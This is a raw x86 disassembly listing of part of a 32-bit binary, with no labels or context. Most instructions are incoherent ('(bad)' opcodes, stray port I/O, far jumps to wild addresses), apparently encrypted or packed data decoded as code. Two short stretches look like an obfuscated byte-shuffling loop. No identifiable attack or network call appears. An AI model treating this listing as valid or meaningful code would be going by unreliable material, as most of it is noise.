  40bfbf:	repz fnstenv [ecx-0x1ea9d1e9]
  40bfc6:	mov    al,ds:0xf8428675
  40bfcb:	mov    edx,esp
  40bfcd:	pop    esi
  40bfce:	mov    ebx,0x65cd946f
  40bfd3:	mov    ebx,ebx
  40bfd5:	gs jecxz 0x40bfb0
  40bfd8:	dec    edx
  40bfd9:	or     eax,ebx
  40bfdb:	mov    bh,bl
  40bfdd:	pop    edx
  40bfde:	popa   
  40bfdf:	loopne 0x40bff5
  40bfe1:	or     al,0xac
  40bfe3:	lock fs dec ebp
  40bfe6:	mov    ah,0xa
  40bfe8:	xchg   BYTE PTR [ebp+0x104bd413],bl
  40bfee:	inc    edx
  40bfef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bff0:	mov    dl,0xa2
  40bff2:	push   edx
  40bff3:	adc    esp,DWORD PTR [edx-0x69cfc652]
  40bff9:	addr16 cli 
  40bffb:	inc    ebx
  40bffc:	sbb    DWORD PTR [ecx-0x12cd17a4],eax
  40c002:	aad    0x18
  40c004:	mov    esp,DWORD PTR [ebx-0x41]
  40c007:	mov    ds:0xeef15633,eax
  40c00c:	xor    bh,dl
  40c00e:	and    al,0x4
  40c010:	sub    ebp,DWORD PTR [ebp-0x4e4fb3e5]
  40c016:	sub    BYTE PTR ds:0x7a7a39ef,bl
  40c01c:	push   esi
  40c01d:	or     edx,DWORD PTR [eax]
  40c01f:	xchg   edi,eax
  40c020:	ins    DWORD PTR es:[edi],dx
  40c021:	mov    esi,0x93ae004e
  40c026:	push   esi
  40c027:	cli    
  40c028:	rcr    DWORD PTR [edx+edi*4-0x3],1
  40c02c:	je     0x40c099
  40c02e:	inc    ebx
  40c02f:	dec    eax
  40c030:	in     al,0xd
  40c032:	hlt    
  40c033:	imul   ecx,DWORD PTR [ecx+eax*2-0x13],0x4b
  40c038:	pop    esp
  40c039:	aam    0xf3
  40c03b:	and    bl,BYTE PTR [edx+0x4a34673a]
  40c041:	xor    BYTE PTR [eax-0x185969e],0xe2
  40c048:	fstp   TBYTE PTR ds:0xe6e1bc83
  40c04e:	aaa    
  40c04f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c050:	ror    BYTE PTR [esi+0x3e],1
  40c053:	push   esi
  40c054:	out    dx,al
  40c055:	push   eax
  40c056:	sub    ebx,DWORD PTR [ebx+0x3f]
  40c059:	cmp    DWORD PTR ds:0xb3f68a87,edx
  40c05f:	(bad)  
  40c060:	aam    0x4c
  40c062:	sbb    DWORD PTR [ecx],edx
  40c064:	fcom   DWORD PTR [ebp-0x26]
  40c067:	repz sbb esp,DWORD PTR [edi*8+0x550f4c86]
  40c06f:	stos   BYTE PTR es:[edi],al
  40c070:	leave  
  40c071:	jo     0x40c0d4
  40c073:	out    dx,eax
  40c074:	push   edi
  40c075:	je     0x40c0d9
  40c077:	into   
  40c078:	mov    ss,esp
  40c07a:	adc    DWORD PTR [edi-0x17661436],esp
  40c080:	sbb    BYTE PTR [edx+0x7e],bl
  40c083:	adc    DWORD PTR [ecx+eax*8],ecx
  40c086:	sub    al,0x4
  40c088:	idiv   DWORD PTR [ebp-0x1d]
  40c08b:	pop    ebx
  40c08c:	pop    ebp
  40c08d:	pop    esi
  40c08e:	sbb    bl,BYTE PTR [eax-0x187f676]
  40c094:	add    DWORD PTR [esi+esi*2],ecx
  40c097:	and    BYTE PTR [edx-0x13],bh
  40c09a:	dec    edx
  40c09b:	mov    dh,0xe5
  40c09d:	pop    esi
  40c09e:	xchg   esp,eax
  40c09f:	sbb    dh,BYTE PTR [ebp+eax*1+0x78]
  40c0a3:	iret   
  40c0a4:	sbb    cl,al
  40c0a6:	loope  0x40c028
  40c0a8:	ret    
  40c0a9:	or     al,0xa8
  40c0ab:	sbb    ah,al
  40c0ad:	(bad)  
  40c0ae:	jmp    0x56b77226
  40c0b3:	jmp    0x49b3a06c
  40c0b8:	jmp    0xbe1b5ae5
  40c0bd:	adc    BYTE PTR [edx+0x54f02fcb],0x81
  40c0c4:	ret    0x960d
  40c0c7:	cwde   
  40c0c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0c9:	iret   
  40c0ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0cb:	mov    ebp,esi
  40c0cd:	iret   
  40c0ce:	js     0x40c0f4
  40c0d0:	xchg   esi,eax
  40c0d1:	xlat   BYTE PTR ds:[ebx]
  40c0d2:	fcomip st,st(3)
  40c0d4:	sub    bh,BYTE PTR [eax-0x18161e7c]
  40c0da:	pushf  
  40c0db:	mov    ds:0x8316276a,eax
  40c0e0:	cmc    
  40c0e1:	int3   
  40c0e2:	ror    DWORD PTR [esi-0x3e34082f],0xec
  40c0e9:	std    
  40c0ea:	cmp    cl,BYTE PTR [ebx+0x7d8bc455]
  40c0f0:	cld    
  40c0f1:	xor    edi,eax
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	ds mov cx,di
  40c144:	hlt    
  40c145:	rol    ah,0x2e
  40c148:	mov    esi,DWORD PTR [eax+0x70]
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c1a7
  40c150:	rcl    BYTE PTR fs:[esi],0xd
  40c154:	mov    dh,ch
  40c156:	cwde   
  40c157:	sub    DWORD PTR [eax],esi
  40c159:	push   ecx
  40c15a:	js     0x40c0ee
  40c15c:	add    eax,0xa0d7c5a9
  40c161:	stos   BYTE PTR es:[edi],al
  40c162:	cld    
  40c163:	adc    dl,BYTE PTR [ebx+0x6b]
  40c166:	fldenv [ebp+0x23]
  40c169:	inc    ecx
  40c16a:	fs clc 
  40c16c:	xor    al,0xe5
  40c16e:	ja     0x40c152
  40c170:	jle    0x40c16d
  40c172:	cmp    al,0x9c
  40c174:	mov    ecx,0x311afdf4
  40c179:	int    0x3e
  40c17b:	ins    DWORD PTR es:[edi],dx
  40c17c:	jp     0x40c176
  40c17e:	xor    ebp,DWORD PTR [ecx+edx*1-0x499a5d66]
  40c185:	repnz push esi
  40c187:	sbb    ch,bl
  40c189:	test   edi,edi
  40c18b:	mov    ch,0x3e
  40c18d:	out    dx,al
  40c18e:	out    0x16,al
  40c190:	aaa    
  40c191:	inc    edx
  40c192:	data16 mov bh,BYTE PTR [eax+esi*8+0x6c]
  40c197:	and    DWORD PTR [ebx-0x6343e6ff],edi
  40c19d:	loope  0x40c172
  40c19f:	out    0xfa,al
  40c1a1:	cmp    eax,ebx
  40c1a3:	and    al,0x8a
  40c1a5:	mov    ?,WORD PTR [edx+0x33fc7b09]
  40c1ab:	mov    bl,0xd2
  40c1ad:	sbb    ebx,esi
  40c1af:	mov    al,0x22
  40c1b1:	mov    ds:0x3d17a2cd,al
  40c1b6:	or     al,0xf
  40c1b8:	dec    eax
  40c1b9:	std    
  40c1ba:	and    ebp,DWORD PTR [ebx+0x41aa9325]
  40c1c0:	fcom   st(5)
  40c1c2:	xchg   ebp,eax
  40c1c3:	push   edi
  40c1c4:	add    DWORD PTR [ebx-0x58],eax
  40c1c7:	and    DWORD PTR [eax],edi
  40c1c9:	mov    ebp,0x67054516
  40c1ce:	sbb    edi,esp
  40c1d0:	in     eax,dx
  40c1d1:	jb     0x40c1fe
  40c1d3:	dec    edi
  40c1d4:	add    al,bh
  40c1d6:	rcl    BYTE PTR [ebp+0x15a14c42],cl
  40c1dc:	(bad)  
  40c1dd:	ror    BYTE PTR [esi],cl
  40c1df:	mov    eax,0xc8c9548
  40c1e4:	mov    ah,0x6b
  40c1e6:	jmp    0x3db412e4
  40c1eb:	sar    DWORD PTR [edi],1
  40c1ed:	rcr    edx,cl
  40c1ef:	or     BYTE PTR ss:[edi+0x6e47d595],cl
  40c1f6:	xor    edi,DWORD PTR [eax+0x6304d694]
  40c1fc:	adc    ecx,DWORD PTR [ebp-0x18]
  40c1ff:	sbb    eax,0x57a09cb9
  40c204:	mov    edi,0xa1df190d
  40c209:	and    al,0x3d
  40c20b:	jb     0x40c223
  40c20d:	inc    eax
  40c20e:	sbb    al,0xf7
  40c210:	push   edx
  40c211:	(bad)  
  40c212:	lock in al,0xeb
  40c215:	sub    BYTE PTR [edx+0x5b70c331],cl
  40c21b:	into   
  40c21c:	popa   
  40c21d:	inc    ebx
  40c21e:	or     esp,DWORD PTR [edi+0x41]
  40c221:	adc    al,0x78
  40c223:	xchg   esi,eax
  40c224:	and    bh,ch
  40c226:	enter  0x1210,0xcb
  40c22a:	scas   al,BYTE PTR es:[edi]
  40c22b:	sub    ebx,eax
  40c22d:	adc    bh,BYTE PTR ds:0xfb63fccc
  40c233:	jmp    0x54861f07
  40c238:	push   ebx
  40c239:	sub    eax,ebx
  40c23b:	pushf  
  40c23c:	add    BYTE PTR [ecx-0x53ecc179],cl
  40c242:	push   ebp
  40c243:	dec    ebx
  40c244:	and    al,0x63
  40c246:	and    DWORD PTR [esi],0xea8621f8
  40c24c:	clc    
  40c24d:	les    edx,FWORD PTR [edx+edx*1]
  40c250:	fisttp WORD PTR [esi+edi*8+0x15938964]
  40c257:	lods   al,BYTE PTR ds:[esi]
  40c258:	add    bh,bh
  40c25a:	fldenv [edx+0x6c8608ee]
  40c260:	jl     0x40c2cf
  40c262:	std    
  40c263:	or     edi,0xe
  40c266:	xchg   edi,eax
  40c267:	add    dh,dh
  40c269:	cs jg  0x40c27f
  40c26c:	mov    BYTE PTR [ebp+0x7a9e2c02],al
  40c272:	cmp    dl,BYTE PTR [edx-0x120d424d]
  40c278:	std    
  40c279:	out    dx,eax
  40c27a:	adc    cl,BYTE PTR [edi]
  40c27c:	test   BYTE PTR [esi],bh
  40c27e:	mov    ecx,0x6c93252d
  40c283:	je     0x40c2c6
  40c285:	sub    edx,edi
  40c287:	inc    ecx
  40c288:	or     eax,0x230bd15f
  40c28d:	dec    ebx
  40c28e:	rcr    ebp,1
  40c290:	rcr    DWORD PTR [ebp+0x2dec0bcc],0x90
  40c297:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c298:	or     BYTE PTR [esi+ecx*2-0x5bc19747],0x9d
  40c2a0:	stc    
  40c2a1:	and    dl,BYTE PTR [edx-0x19]
  40c2a4:	arpl   WORD PTR [edx+0x50],bp
  40c2a7:	(bad)  
  40c2a8:	pop    esi
  40c2a9:	fs retf 
  40c2ab:	sti    
  40c2ac:	pusha  
  40c2ad:	bound  eax,QWORD PTR [ebp-0x3b]
  40c2b0:	xor    al,0x98
  40c2b2:	push   ebx
  40c2b3:	popf   
  40c2b4:	mov    ecx,0x88c06c34
  40c2b9:	add    dl,BYTE PTR [edx+ecx*4]
  40c2bc:	pusha  
  40c2bd:	mov    cl,0x7
  40c2bf:	xlat   BYTE PTR ds:[ebx]
  40c2c0:	pop    es
  40c2c1:	sub    al,BYTE PTR [edi-0x28]
  40c2c4:	add    ecx,esi
  40c2c6:	scas   eax,DWORD PTR es:[edi]
  40c2c7:	push   ss
  40c2c8:	cwde   
  40c2c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2ca:	mov    ds:0x12f9d030,eax
  40c2cf:	add    edx,DWORD PTR [eax+0x19]
  40c2d2:	pop    esp
  40c2d3:	and    DWORD PTR [ebp-0x70],edi
  40c2d6:	repz aaa 
  40c2d8:	daa    
  40c2d9:	mov    DWORD PTR [ebp-0x40c02a48],0xe126dfcb
  40c2e3:	jecxz  0x40c31a
  40c2e5:	aaa    
  40c2e6:	sub    esi,DWORD PTR [ebp+0x5e]
  40c2e9:	int    0xd1
  40c2eb:	rcl    BYTE PTR [ebx-0x6299b66e],cl
  40c2f1:	xchg   BYTE PTR [esi-0x45],dl
  40c2f4:	setg   BYTE PTR [ebx]
  40c2f7:	call   0x38f4:0x51f4fd0f
  40c2fe:	jb     0x40c299
  40c300:	pop    ds
  40c301:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c302:	push   eax
  40c303:	pop    edx
  40c304:	cmp    ch,dl
  40c306:	xor    DWORD PTR [edi-0x7c1f17a2],ecx
  40c30c:	mov    ch,0x56
  40c30e:	adc    al,0xf8
  40c310:	in     al,0x94
  40c312:	cmp    al,0x6d
  40c314:	pop    edx
  40c315:	pop    eax
  40c316:	jmp    0xadaa8787
  40c31b:	xchg   ebp,eax
  40c31c:	fsubr  DWORD PTR [edx+edi*8-0x164c4ebe]
  40c323:	mov    bh,0x70
  40c325:	std    
  40c326:	ret    0x79aa
  40c329:	dec    esp
  40c32a:	xchg   edi,eax
  40c32b:	adc    BYTE PTR [ebx+0x581377cb],0xb5
  40c332:	inc    edx
  40c333:	into   
  40c334:	cld    
  40c335:	out    0x6e,eax
  40c337:	stos   DWORD PTR es:[edi],eax
  40c338:	or     esi,DWORD PTR [ebp-0x20]
  40c33b:	inc    esp
  40c33c:	call   0x232030a5
  40c341:	dec    esi
  40c342:	adc    al,0xde
  40c344:	jno    0x40c3a2
  40c346:	les    esp,FWORD PTR [edx+0x2745dff9]
  40c34c:	and    bh,ah
  40c34e:	adc    ebp,DWORD PTR [esi]
  40c350:	fs adc eax,0xd90efd85
  40c356:	cdq    
  40c357:	gs pop ds
  40c359:	std    
  40c35a:	out    dx,eax
  40c35b:	jmp    0xa083db94
  40c360:	leave  
  40c361:	pop    ecx
  40c362:	es jns 0x40c3da
  40c365:	jbe    0x40c325
  40c367:	adc    dl,BYTE PTR [eax-0xd5637d0]
  40c36d:	not    bh
  40c36f:	adc    edi,DWORD PTR [ebx-0x6f]
  40c372:	push   esp
  40c373:	nop
  40c374:	ds test eax,0x8f00ccd9
  40c37a:	adc    al,BYTE PTR [eax]
  40c37c:	pop    ss
  40c37d:	xor    ah,BYTE PTR [eax]
  40c37f:	push   edi
  40c380:	(bad)  
  40c381:	or     al,BYTE PTR [edx]
  40c383:	jle    0x40c3f4
  40c385:	jmp    0x40c384
  40c387:	and    ch,BYTE PTR [ecx-0x31]
  40c38a:	mov    cl,0x21
  40c38c:	cmp    eax,0x9fe6bba0
  40c391:	arpl   WORD PTR [edi+0x739c8f72],cx
  40c397:	mov    ?,WORD PTR [eax+0x2b]
  40c39a:	xor    DWORD PTR [edi+ebx*8-0x5e6c7d3e],ebx
  40c3a1:	ss sbb bh,bl
  40c3a4:	popf   
  40c3a5:	cmp    ebx,eax
  40c3a7:	inc    esi
  40c3a8:	pop    ebp
  40c3a9:	data16 (bad) 
  40c3ab:	les    esp,FWORD PTR [esi]
  40c3ad:	mov    ds:0xc000fb1,eax
  40c3b2:	sbb    bh,BYTE PTR [edi+0x624e431b]
  40c3b8:	fist   DWORD PTR [edi]
  40c3ba:	js     0x40c418
  40c3bc:	jg     0x40c340
  40c3be:	push   esi
  40c3bf:	fnsave [ecx+0x33]
  40c3c2:	dec    edx
  40c3c3:	adc    esp,edi
  40c3c5:	jg     0x40c401
  40c3c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3c8:	mov    bh,0x2f
  40c3ca:	into   
  40c3cb:	pop    ss
  40c3cc:	popa   
  40c3cd:	imul   esp,esp,0xffffffb0
  40c3d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3d1:	adc    esi,DWORD PTR [edx]
  40c3d3:	xchg   edi,eax
  40c3d4:	lods   eax,DWORD PTR ds:[esi]
  40c3d5:	push   ss
  40c3d6:	je     0x40c3b8
  40c3d8:	es pushf 
  40c3da:	stos   DWORD PTR es:[edi],eax
  40c3db:	mov    al,0x72
  40c3dd:	pop    eax
  40c3de:	and    ebx,DWORD PTR [ecx+0x30]
  40c3e1:	jl     0x40c373
  40c3e3:	dec    esp
  40c3e4:	test   al,0x8e
  40c3e6:	mov    ebp,0xfcf9b96a
  40c3eb:	fiadd  DWORD PTR [ecx]
  40c3ed:	mov    esp,0x67b981ad
  40c3f2:	cmp    esp,DWORD PTR fs:[ecx+0x4358b62e]
  40c3f9:	mov    bl,0x61
  40c3fb:	or     BYTE PTR [ebx-0x5927c64d],dl
  40c401:	clc    
  40c402:	daa    
  40c403:	cmp    eax,0x936c522
  40c408:	dec    ecx
  40c409:	in     al,0x9a
  40c40b:	cmp    al,0xbd
  40c40d:	adc    al,0xf9
  40c40f:	dec    eax
  40c410:	loope  0x40c405
  40c412:	test   al,0x2f
  40c414:	out    0xe6,al
  40c416:	scas   eax,DWORD PTR es:[edi]
  40c417:	mov    ebx,0xad319717
  40c41c:	lahf   
  40c41d:	mov    es,WORD PTR [edx+0x5c]
  40c420:	data16 lahf 
  40c422:	jne    0x40c437
  40c424:	ror    al,cl
  40c426:	xchg   BYTE PTR [edx+0x54baa9f],dl
  40c42c:	sbb    al,0x8e
  40c42e:	mov    ah,0x6e
  40c430:	mov    ebx,0xebbc75f0
  40c435:	sbb    eax,0x522170b5
  40c43a:	cmp    eax,0x344f9820
  40c43f:	fs mov esp,0xb21eb661
  40c445:	or     eax,0xd02abd2a
  40c44a:	ins    DWORD PTR es:[edi],dx
  40c44b:	xchg   esp,eax
  40c44c:	cmp    BYTE PTR [edi-0x6abe32f8],ah
  40c452:	push   esi
  40c453:	sbb    ch,BYTE PTR [ebx+0x2e285962]
  40c459:	dec    ebx
  40c45a:	push   0x94b97de2
  40c45f:	pushf  
  40c460:	sahf   
  40c461:	fstp   TBYTE PTR [esi+0x16]
  40c464:	inc    ecx
  40c465:	(bad)  
  40c466:	js     0x40c414
  40c468:	jle    0x40c4d7
  40c46a:	call   0xd9e180c8
  40c46f:	xchg   edx,eax
  40c470:	scas   eax,DWORD PTR es:[edi]
  40c471:	in     eax,0x5e
  40c473:	ja     0x40c475
  40c475:	fst    st(0)
  40c477:	sahf   
  40c478:	fild   QWORD PTR [ecx]
  40c47a:	cmp    ch,al
  40c47c:	lds    eax,FWORD PTR gs:[edi-0x2309c84a]
  40c483:	leave  
  40c484:	je     0x40c4c8
  40c486:	mov    ah,0xd4
  40c488:	add    edx,DWORD PTR [eax-0x7b0eb624]
  40c48e:	(bad)  
  40c48f:	out    dx,al
  40c490:	aas    
  40c491:	adc    eax,0xd4acec39
  40c496:	fs js  0x40c4bb
  40c499:	mov    ds:0x294b6d35,eax
  40c49e:	mov    dh,0xd
  40c4a0:	cli    
  40c4a1:	cwde   
  40c4a2:	jmp    0xe736:0xca0dc0f1
  40c4a9:	pop    eax
  40c4aa:	and    BYTE PTR [ebx-0xbc1a5c5],0x8f
  40c4b1:	mov    ds:0xe83c336c,eax
  40c4b6:	xchg   ebx,eax
  40c4b7:	in     al,0x9d
  40c4b9:	and    ebp,DWORD PTR [eax+edi*4]
  40c4bc:	scas   eax,DWORD PTR es:[edi]
  40c4bd:	mov    ebp,0xc55351f7
  40c4c2:	loop   0x40c46f
  40c4c4:	mov    ah,0x56
  40c4c6:	sub    cl,BYTE PTR [edi]
  40c4c8:	add    DWORD PTR [edx-0x4f],ecx
  40c4cb:	jp     0x40c48a
  40c4cd:	into   
  40c4ce:	jns    0x40c4f4
  40c4d0:	pop    ebp
  40c4d1:	mov    cr6,edi
  40c4d4:	mov    BYTE PTR [esp+edx*2-0x6f5b00a],ah
  40c4db:	xor    BYTE PTR [ebp+0x47045175],al
  40c4e1:	sbb    esp,DWORD PTR [eax+0x11]
  40c4e4:	xchg   ebx,eax
  40c4e5:	adc    ecx,DWORD PTR [edx+0x7ea313c3]
  40c4eb:	in     al,dx
  40c4ec:	add    al,0x4
  40c4ee:	sub    DWORD PTR [ebx+0x5503d033],ebp
  40c4f4:	in     al,dx
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	mov    ds:0x4dfda544,eax
  40c545:	mov    BYTE PTR [eax+0x70],dh
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c5c6
  40c54d:	sahf   
  40c54e:	ins    DWORD PTR es:[edi],dx
  40c54f:	in     al,0x63
  40c551:	ror    BYTE PTR ds:0xefa57d8b,1
  40c557:	and    ch,BYTE PTR [esp+ebx*8]
  40c55a:	lods   eax,DWORD PTR ds:[esi]
  40c55b:	mov    bl,0x37
  40c55d:	push   ds
  40c55e:	std    
  40c55f:	ss aam 0x2a
  40c562:	pop    eax
  40c563:	mov    esi,0xb7198d2a
  40c568:	sahf   
  40c569:	test   DWORD PTR [edi+0x24],0x33eae9d1
  40c570:	xor    bl,BYTE PTR [edi+0x3f]
  40c573:	mov    ecx,0xeb1682cc
  40c578:	adc    DWORD PTR [eax-0x17],edx
  40c57b:	add    BYTE PTR [edx+0x2a18acb8],dl
  40c581:	leave  
  40c582:	jl     0x40c55d
  40c584:	addr16 jae 0x40c5be
  40c587:	shr    DWORD PTR [edx],1
  40c589:	push   esp
  40c58a:	adc    eax,0xc9aa0639
  40c58f:	jnp    0x40c573
  40c591:	xchg   ebp,eax
  40c592:	imul   edx,DWORD PTR [edi+0x6b],0xe8cb0946
  40c599:	xchg   ecx,eax
  40c59a:	xchg   edx,eax
  40c59b:	jae    0x40c545
  40c59d:	test   al,0x93
  40c59f:	and    eax,0xd204dee5
  40c5a4:	push   edx
  40c5a5:	ins    BYTE PTR es:[edi],dx
  40c5a6:	sti    
  40c5a7:	(bad)  
  40c5a8:	lds    ecx,FWORD PTR [esi-0xd]
  40c5ab:	add    dh,BYTE PTR ds:0xd613ed09
  40c5b1:	mov    edi,0xf980bcb0
  40c5b6:	outs   dx,DWORD PTR ds:[esi]
  40c5b7:	cmp    esi,ebx
  40c5b9:	or     BYTE PTR [eax+0x17],ah
  40c5bc:	test   DWORD PTR [edi-0x3c],ecx
  40c5bf:	mov    eax,0x7427dbd2
  40c5c4:	aaa    
  40c5c5:	(bad)  
  40c5c6:	mov    eax,ds:0xef743533
  40c5cb:	retf   0x4e5
  40c5ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5cf:	int    0x31
  40c5d1:	repnz push ebp
  40c5d3:	add    BYTE PTR [eax+0x68cb7a2a],al
  40c5d9:	repnz scas eax,DWORD PTR es:[edi]
  40c5db:	ins    BYTE PTR es:[edi],dx
  40c5dc:	jns    0x40c583
  40c5de:	adc    dl,BYTE PTR [eax]
  40c5e0:	ret    0x8f2f
  40c5e3:	add    eax,edi
  40c5e5:	lods   eax,DWORD PTR ds:[esi]
  40c5e6:	loop   0x40c64d
  40c5e8:	(bad)  
  40c5e9:	out    0x24,eax
  40c5eb:	mov    ah,0xbb
  40c5ed:	or     ah,dh
  40c5ef:	paddw  mm3,QWORD PTR [edx]
  40c5f2:	addr16 sti 
  40c5f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5f5:	jmp    0x23544764
  40c5fa:	add    al,0xe3
  40c5fc:	imul   eax,DWORD PTR [edi],0xad1dd4e9
  40c602:	mov    WORD PTR [esi],ds
  40c604:	(bad)  
  40c605:	lds    ebp,FWORD PTR [eax]
  40c607:	cmp    esi,edx
  40c609:	xchg   ebx,eax
  40c60a:	sbb    eax,0x4935d322
  40c60f:	ret    0x3fee
  40c612:	call   0x7049:0xfdf5651a
  40c619:	inc    eax
  40c61a:	cmp    ebx,DWORD PTR [ecx-0x28d367c0]
  40c620:	lahf   
  40c621:	adc    BYTE PTR [edi+0x28],dl
  40c624:	mov    edi,ebp
  40c626:	repnz sub ebp,ebp
  40c629:	pusha  
  40c62a:	rol    DWORD PTR [ecx+0x638a0e61],cl
  40c630:	outs   dx,DWORD PTR ds:[esi]
  40c631:	dec    eax
  40c632:	mov    dh,0x4a
  40c634:	lock jb 0x40c63a
  40c637:	mov    esp,0x3d9bb0f6
  40c63c:	sbb    eax,0xfac46c81
  40c641:	sub    DWORD PTR [ecx+0x1c],esp
  40c644:	hlt    
  40c645:	pop    ecx
  40c646:	push   cs
  40c647:	ss shl ch,cl
  40c64a:	dec    edi
  40c64b:	inc    edi
  40c64c:	and    bh,0xfd
  40c64f:	and    bl,BYTE PTR [edx+0x3982fbe7]
  40c655:	je     0x40c68c
  40c657:	sub    BYTE PTR [ebp+0x2b],dl
  40c65a:	adc    al,0x43
  40c65c:	pop    ss
  40c65d:	imul   ebx,edi,0xf401cc80
  40c663:	push   ecx
  40c664:	mov    BYTE PTR [ecx],bl
  40c666:	(bad)  
  40c667:	test   esp,0xe27b2640
  40c66d:	cmp    eax,0x9ff4f6c
  40c672:	retf   0x1ecc
  40c675:	cs sahf 
  40c677:	cmc    
  40c678:	fs inc ebp
  40c67a:	ins    DWORD PTR es:[edi],dx
  40c67b:	sahf   
  40c67c:	cmp    DWORD PTR [edi+0x11],esi
  40c67f:	xor    esp,DWORD PTR [eax-0xf]
  40c682:	lds    ebp,FWORD PTR [ecx+0x29]
  40c685:	lea    ebp,[edx]
  40c687:	inc    eax
  40c688:	icebp  
  40c689:	jp     0x40c6cc
  40c68b:	mov    DWORD PTR [edx-0x69],0xd808eadd
  40c692:	iret   
  40c693:	inc    ecx
  40c694:	sbb    BYTE PTR [ebx+0x35ba4834],dl
  40c69a:	aaa    
  40c69b:	jp     0x40c68d
  40c69d:	out    dx,al
  40c69e:	loopne 0x40c6d4
  40c6a0:	aas    
  40c6a1:	out    dx,al
  40c6a2:	lock xchg DWORD PTR [ebx-0x20],edx
  40c6a6:	mov    dh,0xc1
  40c6a8:	xlat   BYTE PTR ds:[ebx]
  40c6a9:	sbb    cl,BYTE PTR [ecx-0x1fbce1c5]
  40c6af:	fst    DWORD PTR [edx+0x2d]
  40c6b2:	mov    WORD PTR [esi-0x1df35b52],ds
  40c6b8:	jp     0x40c693
  40c6ba:	icebp  
  40c6bb:	das    
  40c6bc:	adc    BYTE PTR [esp+esi*2],cl
  40c6bf:	mov    DWORD PTR [edx],esi
  40c6c1:	outs   dx,BYTE PTR ds:[esi]
  40c6c2:	out    dx,al
  40c6c3:	cmp    eax,0xee2043f3
  40c6c8:	mov    esp,0x6ac8661d
  40c6cd:	pop    edi
  40c6ce:	lea    ecx,[esi-0x14]
  40c6d1:	push   esp
  40c6d2:	ficomp DWORD PTR es:[ecx-0x32]
  40c6d6:	lahf   
  40c6d7:	mov    esp,0x504b6bbc
  40c6dc:	test   eax,0xf6f5df7f
  40c6e1:	jno    0x40c6b2
  40c6e3:	pop    ecx
  40c6e4:	rol    BYTE PTR [edi+0x4f],0x4d
  40c6e8:	neg    BYTE PTR [edi+0x64]
  40c6eb:	out    0x43,al
  40c6ed:	xchg   edx,eax
  40c6ee:	iret   
  40c6ef:	adc    ebx,DWORD PTR [edi+0x207ff928]
  40c6f5:	mov    eax,ds:0xaa85c688
  40c6fa:	sub    al,BYTE PTR [ebx+0x73afb3ad]
  40c700:	jmp    0xb3c63c65
  40c705:	adc    eax,0xc7fd47b9
  40c70a:	dec    edi
  40c70b:	dec    edx
  40c70c:	sbb    BYTE PTR [edx-0x79],bl
  40c70f:	loopne 0x40c6d4
  40c711:	jnp    0x40c705
  40c713:	adc    eax,0xff0d1a52
  40c718:	sub    eax,0x24a4bddf
  40c71e:	cmc    
  40c71f:	xor    eax,ebx
  40c721:	fwait
  40c722:	add    eax,0x2a1bc10
  40c727:	fs jecxz 0x40c77e
  40c72a:	fdiv   DWORD PTR [ebp+0x5f]
  40c72d:	jecxz  0x40c762
  40c72f:	mov    es,WORD PTR [eax-0x7a]
  40c732:	je     0x40c7b3
  40c734:	leave  
  40c735:	test   eax,0x1aff648e
  40c73a:	add    al,0x9e
  40c73c:	(bad)  
  40c73d:	xor    DWORD PTR [ecx-0x7],esp
  40c740:	retf   0x78c
  40c743:	scas   al,BYTE PTR es:[edi]
  40c744:	mov    ds:0xdbaf7e17,eax
  40c749:	test   eax,0x7db61e96
  40c74e:	sub    eax,0xacbffe87
  40c753:	icebp  
  40c754:	push   ds
  40c755:	jno    0x40c708
  40c757:	mov    eax,0x27c329df
